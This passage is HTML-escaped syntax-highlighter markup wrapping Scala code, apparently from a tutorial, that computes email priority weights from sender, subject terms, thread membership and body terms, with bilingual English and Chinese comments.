&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061381091724139-58&quot;&gt;58&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061381091724139-59&quot;&gt;59&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061381091724139-60&quot;&gt;60&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061381091724139-61&quot;&gt;61&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061381091724139-62&quot;&gt;62&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061381091724139-63&quot;&gt;63&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061381091724139-64&quot;&gt;64&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061381091724139-65&quot;&gt;65&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061381091724139-66&quot;&gt;66&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061381091724139-67&quot;&gt;67&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061381091724139-1&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;trainingRanks&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;trainingData&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mail&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061381091724139-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061381091724139-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Determine the weight of the sender, if it is lower than 1, pick 1 instead&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061381091724139-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//确定发送人的权重，如果小于1，则设为1&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061381091724139-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//This is done to prevent the feature from having a negative impact&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061381091724139-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//这是为了防止特征出现负面影响&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061381091724139-7&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;senderWeight&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mailsGroupedBySender&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061381091724139-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;collectFirst&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;case&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mail&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061381091724139-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getOrElse&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061381091724139-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061381091724139-11&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Determine the weight of the subject&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061381091724139-12&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//确定主题的权重&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061381091724139-13&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;termsInSubject&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mail&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;subject&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061381091724139-14&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;replaceAll&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;[^a-zA-Z ]&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061381091724139-15&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toLowerCase&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061381091724139-16&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;nonEmpty&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061381091724139-17&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;stopWords&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;contains&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061381091724139-18&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061381091724139-19&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061381091724139-20&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;termWeight&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;termsInSubject&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061381091724139-21&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;termsInSubject&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061381091724139-22&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061381091724139-23&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;tdm&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;collectFirst&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;case&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061381091724139-24&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getOrElse&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061381091724139-25&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061381091724139-26&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;termsInSubject&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061381091724139-27&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1.0&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061381091724139-28&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061381091724139-29&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Determine if the email is from a thread,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061381091724139-30&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//and if it is the weight from this thread:&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061381091724139-31&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//判断邮件是否来自一个会话，如果是，其在该会话的权重:&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061381091724139-32&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;threadGroupWeight&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Double&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;threadGroupedWithWeights&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061381091724139-33&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;collectFirst&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;case&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mail&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;subject&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;weight&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;weight&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061381091724139-34&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getOrElse&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061381091724139-35&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061381091724139-36&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Determine the commonly used terms in the email and the weight belonging to it:&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061381091724139-37&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//确定邮件中的常用词汇及其权重:&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061381091724139-38&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;termsInMailBody&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mail&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;body&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061381091724139-39&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;replaceAll&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;[^a-zA-Z ]&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061381091724139-40&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toLowerCase&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061381091724139-41&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;nonEmpty&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061381091724139-42&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;stopWords&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;contains&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061381091724139-43&quot;&gt;
